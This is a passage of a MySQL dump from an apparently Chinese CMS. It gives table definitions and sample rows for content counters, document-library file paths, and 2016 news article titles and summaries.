INSERT INTO `jc_content_check` VALUES ('160', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('161', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('162', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('163', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('164', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('165', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('166', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('167', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('168', '3', null, '0', null, null);
INSERT INTO `jc_content_check` VALUES ('169', '3', null, '0', null, null);

-- ----------------------------
-- Table structure for jc_content_count
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_count`;
CREATE TABLE `jc_content_count` (
  `content_id` int(11) NOT NULL,
  `views` int(11) NOT NULL DEFAULT '0' COMMENT '总访问数',
  `views_month` int(11) NOT NULL DEFAULT '0' COMMENT '月访问数',
  `views_week` int(11) NOT NULL DEFAULT '0' COMMENT '周访问数',
  `views_day` int(11) NOT NULL DEFAULT '0' COMMENT '日访问数',
  `comments` int(11) NOT NULL DEFAULT '0' COMMENT '总评论数',
  `comments_month` int(11) NOT NULL DEFAULT '0' COMMENT '月评论数',
  `comments_week` smallint(6) NOT NULL DEFAULT '0' COMMENT '周评论数',
  `comments_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日评论数',
  `downloads` int(11) NOT NULL DEFAULT '0' COMMENT '总下载数',
  `downloads_month` int(11) NOT NULL DEFAULT '0' COMMENT '月下载数',
  `downloads_week` smallint(6) NOT NULL DEFAULT '0' COMMENT '周下载数',
  `downloads_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日下载数',
  `ups` int(11) NOT NULL DEFAULT '0' COMMENT '总顶数',
  `ups_month` int(11) NOT NULL DEFAULT '0' COMMENT '月顶数',
  `ups_week` smallint(6) NOT NULL DEFAULT '0' COMMENT '周顶数',
  `ups_day` smallint(6) NOT NULL DEFAULT '0' COMMENT '日顶数',
  `downs` int(11) NOT NULL DEFAULT '0' COMMENT '总踩数',
  PRIMARY KEY (`content_id`),
  KEY `index_jc_content_count_views_day` (`views_day`),
  KEY `index_jc_content_count_views_week` (`views_week`),
  KEY `index_jc_content_count_views_month` (`views_month`),
  KEY `index_jc_content_count_views` (`views`),
  KEY `index_jc_content_count_comments_day` (`comments_day`),
  KEY `index_jc_content_count_comments_month` (`comments_month`),
  KEY `index_jc_content_count_comments_week` (`comments_week`),
  KEY `index_jc_content_count_comments` (`comments`),
  KEY `index_jc_content_count_downloads_day` (`downloads_day`),
  KEY `index_jc_content_count_downloads_month` (`downloads_month`),
  KEY `index_jc_content_count_downloads_week` (`downloads_week`),
  KEY `index_jc_content_count_downloads` (`downloads`),
  KEY `index_jc_content_count_ups_day` (`ups_day`),
  KEY `index_jc_content_count_ups_week` (`ups_week`),
  KEY `index_jc_content_count_ups_month` (`ups_month`),
  KEY `index_jc_content_count_ups` (`ups`),
  CONSTRAINT `fk_jc_count_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容计数表';

-- ----------------------------
-- Records of jc_content_count
-- ----------------------------
INSERT INTO `jc_content_count` VALUES ('2', '14', '13', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('7', '39', '34', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('11', '22', '21', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('12', '10', '10', '0', '0', '1', '1', '1', '1', '0', '0', '0', '0', '1', '1', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('13', '31', '26', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('14', '60', '46', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '14', '14', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('23', '17', '17', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '12', '12', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('27', '9', '9', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '2', '2', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('28', '9', '9', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '2', '2', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('29', '4', '4', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '1', '1', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('30', '134', '134', '0', '0', '1', '1', '0', '0', '0', '0', '0', '0', '44', '44', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('32', '5', '5', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '2', '2', '0', '0', '1');
INSERT INTO `jc_content_count` VALUES ('33', '54', '54', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '18', '18', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('36', '4', '4', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('37', '12', '12', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '2', '2', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('39', '34', '34', '0', '0', '1', '1', '0', '0', '0', '0', '0', '0', '17', '17', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('53', '3', '3', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('55', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('57', '4', '4', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('59', '2', '2', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('61', '3', '3', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('63', '2', '2', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('67', '28', '28', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('68', '51', '51', '0', '0', '0', '0', '0', '0', '1', '1', '1', '1', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('74', '59', '59', '0', '0', '3', '3', '0', '0', '1', '1', '1', '1', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('111', '16', '16', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '12', '12', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('112', '18', '18', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '16', '16', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('113', '31', '31', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '13', '13', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('114', '19', '19', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('115', '8', '8', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('116', '2', '2', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('117', '18', '18', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('118', '2', '2', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('119', '2', '2', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('120', '1', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('121', '10', '10', '1', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('122', '2', '2', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('123', '13', '13', '0', '0', '1', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('124', '3', '3', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('125', '2', '2', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('126', '2', '2', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('127', '1', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('128', '2', '2', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('129', '20', '20', '1', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('130', '30', '30', '0', '0', '1', '1', '0', '0', '0', '0', '0', '0', '12', '12', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('131', '18', '18', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '15', '15', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('132', '7', '7', '0', '0', '2', '2', '0', '0', '0', '0', '0', '0', '1', '1', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('133', '1', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('134', '1', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('135', '1', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('136', '5', '5', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('137', '1', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('138', '2', '2', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('139', '2', '2', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('141', '2', '2', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('142', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('143', '12', '12', '6', '2', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('144', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('145', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('146', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('147', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('148', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('149', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('150', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('151', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('152', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('153', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('154', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('155', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('156', '2', '2', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('157', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('158', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('159', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('160', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('161', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('162', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('163', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('164', '3', '3', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('165', '1', '1', '1', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('166', '3', '3', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('167', '3', '3', '1', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('168', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');
INSERT INTO `jc_content_count` VALUES ('169', '6', '6', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0');

-- ----------------------------
-- Table structure for jc_content_doc
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_doc`;
CREATE TABLE `jc_content_doc` (
  `content_id` int(11) NOT NULL,
  `doc_path` varchar(255) NOT NULL COMMENT '文档路径',
  `swf_path` varchar(255) DEFAULT NULL COMMENT '转换的swf路径',
  `grain` int(11) NOT NULL DEFAULT '0' COMMENT '财富收益',
  `down_need` int(11) NOT NULL DEFAULT '0' COMMENT '下载需要财富',
  `is_open` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否开放',
  `file_suffix` varchar(10) NOT NULL COMMENT '文档文件格式',
  `avg_score` float(11,1) NOT NULL DEFAULT '0.0' COMMENT '平均得分',
  `swf_num` int(11) NOT NULL DEFAULT '1' COMMENT 'swf文件总量',
  `pdf_path` varchar(255) DEFAULT '' COMMENT '转换后pdf路径',
  PRIMARY KEY (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='文库相关';

-- ----------------------------
-- Records of jc_content_doc
-- ----------------------------
INSERT INTO `jc_content_doc` VALUES ('67', '/wenku/www/201609/26140852umf4.doc', null, '0', '10', '1', 'doc', '0.0', '0', '/wenku/www/201609/26140852umf4.pdf');
INSERT INTO `jc_content_doc` VALUES ('68', '/wenku/www/201609/26143427z84z.docx', null, '0', '1', '1', 'docx', '0.0', '0', '/wenku/www/201609/26143427z84z.pdf');
INSERT INTO `jc_content_doc` VALUES ('74', '/wenku/www/201609/30111538pwok.ppt', null, '5', '5', '1', 'ppt', '2.7', '0', '/wenku/www/201609/30111538pwok.pdf');
INSERT INTO `jc_content_doc` VALUES ('133', '/wenku/www/201610/10140727x1oa.docx', null, '0', '10', '1', 'docx', '0.0', '0', '/wenku/www/201610/10140727x1oa.pdf');
INSERT INTO `jc_content_doc` VALUES ('134', '/wenku/www/201610/10141136uie3.pdf', null, '0', '5', '1', 'pdf', '0.0', '0', '/wenku/www/201610/10141136uie3.pdf');
INSERT INTO `jc_content_doc` VALUES ('135', '/wenku/www/201610/10141333ijbu.docx', null, '0', '30', '1', 'docx', '0.0', '0', '/wenku/www/201610/10141333ijbu.pdf');
INSERT INTO `jc_content_doc` VALUES ('136', '/wenku/www/201610/101414578yc2.pdf', null, '0', '10', '1', 'pdf', '0.0', '0', '/wenku/www/201610/101414578yc2.pdf');
INSERT INTO `jc_content_doc` VALUES ('137', '/wenku/www/201610/101415310pgl.ppt', null, '0', '3', '1', 'ppt', '0.0', '0', '/wenku/www/201610/101415310pgl.pdf');
INSERT INTO `jc_content_doc` VALUES ('138', '/wenku/www/201610/10141954qukj.docx', null, '0', '10', '1', 'docx', '0.0', '0', '/wenku/www/201610/10141954qukj.pdf');
INSERT INTO `jc_content_doc` VALUES ('139', '/wenku/www/201610/10142429v5ra.pdf', null, '0', '10', '1', 'pdf', '0.0', '0', '/wenku/www/201610/10142429v5ra.pdf');

-- ----------------------------
-- Table structure for jc_content_ext
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_ext`;
CREATE TABLE `jc_content_ext` (
  `content_id` int(11) NOT NULL,
  `title` varchar(150) NOT NULL COMMENT '标题',
  `short_title` varchar(150) DEFAULT NULL COMMENT '简短标题',
  `author` varchar(100) DEFAULT NULL COMMENT '作者',
  `origin` varchar(100) DEFAULT NULL COMMENT '来源',
  `origin_url` varchar(255) DEFAULT NULL COMMENT '来源链接',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `release_date` datetime NOT NULL COMMENT '发布日期',
  `media_path` varchar(255) DEFAULT NULL COMMENT '媒体路径',
  `media_type` varchar(20) DEFAULT NULL COMMENT '媒体类型',
  `title_color` varchar(10) DEFAULT NULL COMMENT '标题颜色',
  `is_bold` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否加粗',
  `title_img` varchar(100) DEFAULT NULL COMMENT '标题图片',
  `content_img` varchar(100) DEFAULT NULL COMMENT '内容图片',
  `type_img` varchar(100) DEFAULT NULL COMMENT '类型图片',
  `link` varchar(255) DEFAULT NULL COMMENT '外部链接',
  `tpl_content` varchar(100) DEFAULT NULL COMMENT '指定模板',
  `need_regenerate` tinyint(1) NOT NULL DEFAULT '1' COMMENT '需要重新生成静态页',
  `tpl_mobile_content` varchar(100) DEFAULT NULL COMMENT '手机内容页模板',
  `toplevel_date` datetime DEFAULT NULL COMMENT '固顶到期日期',
  `pigeonhole_date` datetime DEFAULT NULL COMMENT '归档日期',
  PRIMARY KEY (`content_id`),
  CONSTRAINT `fk_jc_ext_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容扩展表';

-- ----------------------------
-- Records of jc_content_ext
-- ----------------------------
INSERT INTO `jc_content_ext` VALUES ('2', '法国尼斯发生汽车冲撞事故 已致75人死上百人伤', null, null, null, null, null, '2016-07-15 14:47:24', null, null, null, '0', null, null, '/u/cms/www/201607/15154249ucra.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('7', '震撼的视角！2016年度无人机摄影大赛佳作大赏', null, null, null, null, null, '2016-07-15 15:33:26', null, null, null, '0', null, null, '/u/cms/www/201607/151530033koq.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('11', '全国28省遭灾 已投入抗洪抢险777万人次', '全国28省遭灾 已投入抗洪抢险777万人次', null, null, null, '据初步统计，截至7月13日，长江中下游湖北、湖南、江西、安徽、江苏等5省堤防巡查防守和抢险共投入62.2万人(含部队3.08万人)，6月30日以来已累计投入抗洪抢险777万人次。', '2016-07-15 16:23:32', null, null, null, '0', null, null, '/u/cms/www/201701/160016148i9t.jpg', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('12', '习近平就法国尼斯恐袭事件向法总统致慰问电', null, null, null, null, '当地时间2016年7月14日，法国国庆日，据法国媒体报道，法国尼斯一辆货车突然冲击人群发动恐怖袭击，据最新消息称，有84人丧生，目前事故原因仍在进一步调查之中。', '2016-07-15 17:22:47', null, null, null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('13', '中国空军航空兵赴南海常态化战斗巡航', null, null, null, null, null, '2016-07-19 14:12:48', null, null, null, '0', null, null, '/u/cms/www/201607/19141129f6g4.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('14', '习近平宁夏考察第一天：长征永远在路上', null, null, null, null, '习近平考察宁夏首站到固原，冒雨向红军长征会师纪念碑敬献花篮。', '2016-07-19 14:26:30', null, null, null, '0', null, null, '/u/cms/www/201607/19142033fu5h.jpg', null, null, '0', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('23', '“十一”黄金周凯里地区文化旅游活动精彩纷呈', null, null, '黔东南新闻网', 'http://qdnrbs.cn/htmls/shzh/20160913/137451.html', null, '2016-09-13 17:16:04', null, 'CK', null, '0', null, null, null, null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('27', '“一带一路”：习近平打开的“筑梦空间”', null, null, null, null, '【学习进行时】在不久前举行的推进“一带一路”建设工作座谈会上，习近平要求：“以钉钉子精神抓下去，一步一步把‘一带一路’建设推向前进，让‘一带一路’建设造福沿线各国人民。”', '2016-09-22 16:30:13', null, 'CK', null, '0', null, null, '/u/cms/www/201609/23150119m7z0.jpg', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('28', '加拿大同意与中国协商引渡条约 转变抵制态度', null, null, null, null, '该项目声明，“中国专家将被邀请协助核查不被允许从中国内地来加拿大的人员的身份，”以便将他们遣返回国。', '2016-09-22 16:56:46', null, 'CK', null, '0', null, null, '/u/cms/www/201609/22165418ezkw.jpg', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('29', '深圳二手房卖主悔约不服判决 纠集60余人冲击法院', null, null, null, null, '新华社深圳9月22日专电（记者孙飞）记者22日从深圳市公安局福田分局获悉，深圳数名二手房卖主，因房价上涨不愿履行协议与买家发生纠纷，并对深圳市中院相关判决不满，聚集60余人前往深圳市中院闹访。', '2016-09-23 09:07:33', null, 'CK', null, '0', null, null, null, null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('30', '不实名手机号停机在即 移动：不对任何社会渠道授权网络售卡', null, null, null, null, '中新网北京9月23日电 (吴涛)中新网从三大运营商处获悉，此前传北京地区未实名手机用户10月15日将被停机，实际是分批执行，10月15日开始，最晚至10月31日截止。', '2016-09-23 09:09:41', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('32', '台北故宫将拆除成龙所捐12兽首复制品 成龙回应', null, null, null, null, '成龙捐给台北故宫(微博)南院的12生肖兽首，面临斩首命运。', '2016-09-23 09:19:38', null, 'CK', null, '0', null, null, '/u/cms/www/201609/23091850z61y.jpg', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('33', '亚马逊股价首破800美元大关 市值稳居全球上市公司第四', null, null, null, null, '亚马逊的股价在纽约当地时间周四上午首次突破每股800美元大关。亚马逊以3860亿美元的市值稳居全球上市公司第四的位置，仅次于苹果、谷歌(微博)母公司Alphabet和微软', '2016-09-23 09:23:39', null, 'CK', null, '0', null, null, '/u/cms/www/201609/23092240hxg8.jpg', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('36', '海银系接盘匹凸匹谜局待解：P2P业务惨淡收场 多次被调查', null, null, null, null, '9月20日，匹凸匹投资者索赔案开庭，有十多位投资者向匹凸匹发起索赔。今年3月，匹凸匹公告，因未及时披露多项对外重大担保、重大诉讼事项及2013年年报中未披露对外重大事项，证监会对匹凸匹处40万元罚款，对鲜言处30万元罚款。前述投资者认为因虚假陈述行为而受到损失。', '2016-09-23 09:40:21', null, 'CK', null, '0', null, null, '/u/cms/www/201609/23093922giys.jpg', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('37', '苹果研发神秘新设备：体积类似Apple TV 支持NFC蓝牙', null, null, null, null, '近日，美国联邦通信委员会意外曝光了苹果正在研发的一款新设备，其体积类似于苹果机顶盒（Apple TV），具体的用途尚不得而知。', '2016-09-23 09:43:34', null, 'CK', null, '0', null, null, '/u/cms/www/201609/230942139uh5.jpg', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('39', '四川理塘县发生4.9级地震 震源深度19千米', null, null, null, null, '中国地震台网正式测定：09月23日00时47分在四川甘孜州理塘县（北纬30.09度，东经99.64度）发生4.9级地震，震源深度19千米。', '2016-09-23 09:54:17', null, 'CK', null, '0', null, null, '/u/cms/www/201609/23095358y6s6.jpg', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('53', '北京天安门广场“祝福祖国”大花篮吊装完毕', null, null, null, null, null, '2016-09-26 10:19:13', '/u/cms/www/201610/08150638q3zr.mp4', 'CK', null, '0', null, null, '/u/cms/www/201609/26101908i5ds.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('55', '墨西哥一油轮失火', null, null, null, null, null, '2016-09-26 10:20:11', '/u/cms/www/201610/08150638q3zr.mp4', 'CK', null, '0', null, null, '/u/cms/www/201609/26102008qcao.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('57', '本网记者体验360行之【183】另类“复制”', null, null, null, null, null, '2016-09-26 10:21:19', '/u/cms/www/201610/08150638q3zr.mp4', 'CK', null, '0', null, null, '/u/cms/www/201609/26102115joze.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('59', '旅比大熊猫宝宝取名“天宝”', null, null, null, null, null, '2016-09-26 10:22:24', '/u/cms/www/201610/08150638q3zr.mp4', 'CK', null, '0', null, null, '/u/cms/www/201609/261022192w54.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('61', '莫斯科举办国际灯光节', null, null, null, null, null, '2016-09-26 10:29:06', '/u/cms/www/201610/08150638q3zr.mp4', 'CK', null, '0', null, null, '/u/cms/www/201609/26102904f2l8.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('63', '宇航员拍摄地球夜景：灯火辉煌灿烂 海水平滑如镜', null, null, null, null, null, '2016-09-26 10:30:05', '/u/cms/www/201610/08150638q3zr.mp4', 'CK', null, '0', null, null, '/u/cms/www/201609/26103003hrib.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('67', '2014全行业运营数据分析报告', null, null, null, null, '洞察运营数据360行，行行有研究！', '2016-09-26 14:08:56', null, null, null, '0', null, null, '/u/cms/www/201609/301143025tdb.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('68', '乌镇自助游经典攻略', null, null, null, null, '乌镇是典型的中国江南地区水乡古镇，有“鱼米之乡，丝绸之府”之称，是“江南六大古镇”之一。', '2016-09-26 14:34:34', null, null, null, '0', null, null, '/u/cms/www/201609/30114226529k.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('74', '2013年国家公务员考试备战资料', null, null, null, null, '文库联合中公教育为您准备了2013年国家公务员考试文档。包括备考总攻略、行测-言语理解、行测-数量关系、行测-判断推理、行测-资料分析、行测-常识判断、申论-归纳概括、申论-分析原因、申论-提出对策、申论-文章写作、历年真题、模拟试题。祝您考试顺利。', '2016-09-29 09:28:56', null, null, null, '0', null, null, '/u/cms/www/201609/29093250bbit.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('111', '专访百度科学家徐伟：百度比谷歌的人工智能平台更易上手', null, null, null, null, '“开发者在使用时，学习成本较低，这是我们平台易用性的体现。”负责搭建百度深度学习平台PaddlePaddle的百度美国研究院科学家徐伟22日在接受腾讯科技专访时表示。', '2016-10-10 11:45:47', null, 'CK', null, '0', null, null, '/u/cms/www/201610/10114452yjhh.jpg', null, null, '1', '', null, null);
